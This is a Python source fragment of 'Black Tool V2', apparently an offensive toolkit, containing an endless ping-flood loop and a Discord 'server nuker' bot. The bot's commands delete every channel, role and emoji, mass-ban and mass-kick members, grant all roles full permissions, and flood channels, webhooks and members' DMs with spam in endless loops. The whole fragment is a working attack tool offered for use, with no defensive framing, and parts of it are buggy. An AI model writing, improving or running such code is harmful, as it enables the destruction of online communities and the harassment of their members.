[>]Enter the IP of a site or person:""", Colors.black_to_green, interval=0.000)
 i2 = Write.Input(f"""
[>]How many times you want to ping the IP:""", Colors.black_to_green, interval=0.000)
 Write.Print(f"""
[+]Pinging the IP:{i3}...""", Colors.black_to_white, interval=0.000)
 time.sleep(1)
 os.system('cls')
 os.system("color a")
 while True:
  subprocess.call("ping "+ i3 ,shell=True)

 
elif choice == "1":
 system('title Black Tool V2 - [1]Server Nuker')     
 TOKEN = Write.Input(f"[%]Input Bot Token: ", Colors.purple_to_blue, interval=0.000)
 prefix = Write.Input(f"[%]Prefix:", Colors.purple_to_blue, interval=0.000)
 SPAM_MESSAGE = Write.Input("[%]Input your Spam Message: ", Colors.purple_to_blue, interval=0.000)
 CHANNEL_SPAM = Write.Input("[%]Input Spam Create Channel Name: ", Colors.purple_to_blue, interval=0.000)
 ROLE_SPAM = Write.Input("[%]Input role names:", Colors.purple_to_blue, interval=0.000)
 DM_ALL = Write.Input("[%]Input Dm Message for all Members: ", Colors.purple_to_blue, interval=0.000)

bot = commands.Bot(command_prefix=prefix ,help_command=None, intents=disnake.Intents.all())
bot.remove_command('help')

@bot.event
async def on_ready():
    print(f"""{Style.DIM}{Fore.LIGHTCYAN_EX}
{Fore.BLACK}Bot is ready for nuke │ {Fore.MAGENTA}.help {Fore.LIGHTRED_EX}(show commands in server) | Prefix [{prefix}]
{Fore.GREEN}Bot Commands List:
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}delroles {Fore.LIGHTRED_EX}(deletes all roles)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}kill {Fore.MAGENTA}[message to send in the nuked channel] {Fore.LIGHTRED_EX}(nukes server)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}dmall {Fore.LIGHTRED_EX}(dm all server members)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}clear {Fore.LIGHTRED_EX}(deletes all channels)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}massban {Fore.LIGHTRED_EX}(ban all the users)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}masskick {Fore.LIGHTRED_EX}(kick all the users)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}deleteemoji {Fore.LIGHTRED_EX}(delete all the emoji from a server)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}nickchange {Fore.MAGENTA}[nick] {Fore.LIGHTRED_EX}(Change th nick to every user)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}rolespermissions {Fore.MAGENTA}(Give to all roles every permissions)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}getallmembersid {Fore.MAGENTA}(Get all members id)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}createroles {Fore.MAGENTA}(Create 500+ roles)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}serverinvite {Fore.MAGENTA}(Generate a server invite)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}createemoji [image link] [name of the emojis]{Fore.MAGENTA}(Generate 500+ emoji)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}kick{Fore.MAGENTA}(Kick someone)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}ban{Fore.MAGENTA}(Ban someone)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}guildnick [nick]{Fore.MAGENTA}(Re-Nick the guild)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}leave{Fore.MAGENTA}(Leave the server)
{Fore.LIGHTYELLOW_EX}[$] {Fore.GREEN}{prefix}ping{Fore.MAGENTA}(See the bot latency(ping))
""")

class NukerPage2(disnake.ui.View):
  def __init__(self):
      super().__init__()
      self.value = None

  @disnake.ui.button(label="Helpage [2]", style=disnake.ButtonStyle.red)
  async def nuker2222(self, button: disnake.ui.Button, interaction: disnake.Interaction):
    embed=disnake.Embed(title="Nuker Help", description="Black Nuker V2", color=0xcbceff)
    embed.add_field(name="Mass Ban", value=f"{prefix}massban")
    embed.add_field(name="Mass Kick", value=f"{prefix}masskick")
    embed.add_field(name="Delete all Emoji", value=f"{prefix}deleteemoji")
    embed.add_field(name="Change the nick to every user", value=f"{prefix}nickchange (nick)")
    embed.add_field(name="Give every permissions to every roles", value=f"{prefix}rolespermissions")
    embed.add_field(name="Create 500+ roles", value="!createroles")
    embed.add_field(name="Generate a server invite link", value=f"{prefix}serverinvite")
    embed.add_field(name="Delete all messages from all the channels", value=f"{prefix}clearmessages")
    embed.add_field(name="Create 500+ emoji", value=f"{prefix}createemoji [image link] [name of the emojis]")
    embed.add_field(name="Kick someone", value=f"{prefix}kick [user]")
    embed.add_field(name="Ban someone", value=f"{prefix}ban [user]")
    embed.add_field(name="Re-Nick the guild", value=f"{prefix}guildnick [Nick]")
    embed.add_field(name="Leave the server", value=f"{prefix}leave")
    embed.add_field(name="See the bot ping", value=f"{prefix}ping")
    embed.set_author(icon_url=interaction.author.avatar.url, name=interaction.author.name)
    embed.set_footer(text="Black nuker V2")
    await interaction.send(embed=embed, ephemeral=True)
  @disnake.ui.button(label="Official Server", style=disnake.ButtonStyle.red)
  async def nuker22222(self, button: disnake.ui.Button, interaction: disnake.Interaction):
    await interaction.send("https://discord.gg/2rrJaQnv")

@bot.command()
async def help(ctx):
       embed=disnake.Embed(title="Nuker Help", description="Black Nuker V2", color=0xcbceff)
       embed.add_field(name="Delete Roles:", value=f"{prefix}delroles")
       embed.add_field(name="Nuke Server:", value=f"{prefix}kill server")
       embed.add_field(name="Dm Members:", value=f"{prefix}dmall")
       embed.add_field(name="Delete Channels:", value=f"{prefix}clear")
       view = NukerPage2()
       await ctx.send(embed=embed, view=view)
  
@bot.command()
@commands.has_permissions(manage_messages=True)
async def stop(ctx):
    print(Fore.GREEN + f"{bot.user.name} has logged out successfully!" +
          Fore.RESET)
    sys.exit()

@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f'``Your ping is: {round(bot.latency * 1000)} ms!``')

@bot.command()
async def delroles(ctx):
 await ctx.message.delete()
 for role in ctx.guild.roles:  
     try:  
        await role.delete()
        print(f"Succesfully deleted the role:{role.name}")
     except:
        print(Fore.MAGENTA + f"Cannot delete {role.name}")

@bot.command()
async def kill(ctx):
  channela = 0
  guilda = 0
  msga = 0
  try:
    await ctx.message.delete()
    await ctx.guild.edit(name="Black Tool V2 on top!")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print("Deleted Nuke Message")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            channela = int(channela) + 1
            print( f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{Fore.LIGHTMAGENTA_EX}{str(channela)}{colorama.Fore.CYAN}]{Fore.YELLOW} Deleted Channel:{Fore.GREEN}{channel.name}")
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print("Error While Deleting Channel")
    for u in range(int(100)):
        try:
            await ctx.guild.create_text_channel(CHANNEL_SPAM)
            guilda = int(guilda) + 1
            print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{Fore.LIGHTMAGENTA_EX}{str(guilda)}{colorama.Fore.CYAN}]{Fore.YELLOW} Created Channel:{Fore.GREEN}{CHANNEL_SPAM}")
        except Exception as ex:
          if ex == "disnake.errors.HTTPException: 429 Too Many Requests (error code: 0): You are being rate limited.":
            print(f"{Fore.RED}Rate Limited")
    for channel in ctx.guild.channels:
        for u in range(10000):
            try:
                await channel.send(SPAM_MESSAGE)
                msga = int(msga) + 1
                print(f"{colorama.Fore.CYAN}[{colorama.Fore.MAGENTA}{str(msga)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} {Fore.YELLOW}Sent Message:{Fore.GREEN}{SPAM_MESSAGE}")
            except Exception as exx:
             if exx == "disnake.errors.HTTPException: 429 Too Many Requests (error code: 0): You are being rate limited.":
              print(f"{Fore.RED}Rate Limited")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print(f"Done Nuking {ctx.guild.id}/{ctx.guild.name}")
  except Exception as e:
      embed = disnake.Embed(
          title="Error",
          description="Missing Permission/Rate Limited/Unknown Error"
      )
      await ctx.send(embed=embed)
      sys.stdout.write(colorama.Fore.RED + "> ")
      print("Missing Permission/Rate Limited/Unknown Error")
       
        
@bot.command()
async def dmall(ctx):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                 await user.send(DM_ALL)

            except:
                 print(Fore.MAGENTA + f"Cannot DM{user.name}")


@bot.command()
async def massban(ctx):
        await ctx.message.delete()
        try:
             def massban():
               httpx.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{user['user']['id']}",headers={"authorization":f"Bot {TOKEN}"})
             for user in ctx.guild.members:
               threading.Thread(target=massban).start()
        except:
              print(f"{Fore.RED}Cannot Ban {user.name}")

@bot.command()
async def masskick(ctx):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
              await user.kick()
              print(f"{Fore.GREEN}Kicked {user.name}")
            except:
              print(f"{Fore.RED}Cannot Kick {user.name}")

@bot.command()
async def deleteemoji(ctx):
     await ctx.message.delete()
     for emoji in list(ctx.guild.emojis):
      try:
       await emoji.delete()
       print(Fore.MAGENTA + f"The emoji:{emoji.name} Was deleted" + Fore.RESET)
      except:
       print(Fore.RED + f"The emoji:{emoji.name} Wasn't Deleted" + Fore.RESET)

@bot.command()
async def clear(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
     await channel.delete()  
    guild = ctx.message.guild
    await guild.create_text_channel("Nuked?")
@bot.command()
async def clearmessages(ctx):
        ctx.channel.purge(limit=99999999999999999999999)
        print(f"{Fore.WHITE}> {Fore.RED}Successfully cleared the channel{Fore.WHITE}.")
@bot.command()
async def guildnick(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)
  print(f"{Fore.WHITE}> {Fore.RED}Change guild name to {name}")
@bot.event
async def on_guild_channel_create(channel):
  web = await channel.create_webhook(name="Black Tool V2 - Nuker")
  while True:
    await web.send(SPAM_MESSAGE)
    await channel.send(SPAM_MESSAGE)
@bot.command()
async def leave(ctx):
 await ctx.message.delete
 await ctx.guild.leave()
 print(f"{Fore.WHITE}> {Fore.RED}Leave server{Fore.WHITE}.")
@bot.command()
async def nickchange(ctx, *, nick):
    await ctx.message.delete()
    for user in ctx.guild.members:
     try:
        await user.edit(nick=nick)
        print(Fore.GREEN + f"Changed the nick at the user:{user.name}#{user.discriminator}")
     except:
        print(Fore.RED + f"Cannot change the nick at the user:{user.name}#{user.discriminator}")

@bot.command()
async def rolespermissions(ctx):
     await ctx.message.delete()
     for role in ctx.guild.roles:  
      try:  
        await role.edit(permissions = Permissions.all())
        print(Fore.GREEN + F"Successfully give the permissions to the role:{role.name}")
      except:
        print(Fore.RED + f"Cannot set the permissions to the role:{role.name}")

@bot.command()
async def getallmembersid(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
     try:
      print(f"{user.name}#{user.discriminator} ID:{user.id}")
     except:
        print(Fore.MAGENTA + f"Cannot get the id at the user:{user.name}#{user.discriminator}")

@bot.command()
async def serverinvite(ctx):
  await ctx.message.delete()
  channel = ctx.channel  
  link=await channel.create_invite(max_age = 0, max_uses = 0)
  print(f"There is the server invite: {Fore.BLUE}{link}")
  print(f"There is the server id: {Fore.BLUE}{ctx.guild.id}")

@bot.command()
async def createroles(ctx):
  member = ctx.author
  guild = ctx.guild.id
  await ctx.message.delete()
  while True:
   try:
    await ctx.guild.create_roles(name=ROLE_SPAM)
    Write.Print(f"""
[>]The role {ROLE_SPAM} has been created!""", Colors.cyan_to_blue, interval=0.000)
   except:
    Write.Print(f"""
[>]Error""", Colors.red_to_yellow, interval=0.000)

@bot.command()
async def createemoji(ctx, url: str, *, name):
  member = ctx.author
  guild = ctx.guild
  await ctx.message.delete()
  async with aiohttp.ClientSession().get(url) as r:
   try:
    while True:
     if r.status in range(200, 299):
      img = BytesIO(await r.read())
      bytes = img.getvalue()
      emoji = await ctx.guild.create_custom_emoji(image=bytes, name=name)
      print(f"{Fore.LIGHTGREEN_EX}Creating the emojis:{name} emojis image:{url}")
   except:
      print(f"{Fore.LIGHTRED_EX}I can't create the emoji:{name}")

@bot.command()
async def ban(ctx, member:disnake.Member):
 try:
  await member.ban()
  print(Fore.GREEN + f"Successfully banned {member.name} ")
 except:
  print(Fore.RED + f"I can't ban {member.name} ")

@bot.command()
async def kick(ctx, member:disnake.Member):
 try:
  await member.kick()
  print(Fore.GREEN + f"Successfully kicked {member.name} ")
 except:
  print(Fore.RED + f"I can't kick {member.name} ")

    


bot.run(TOKEN) 



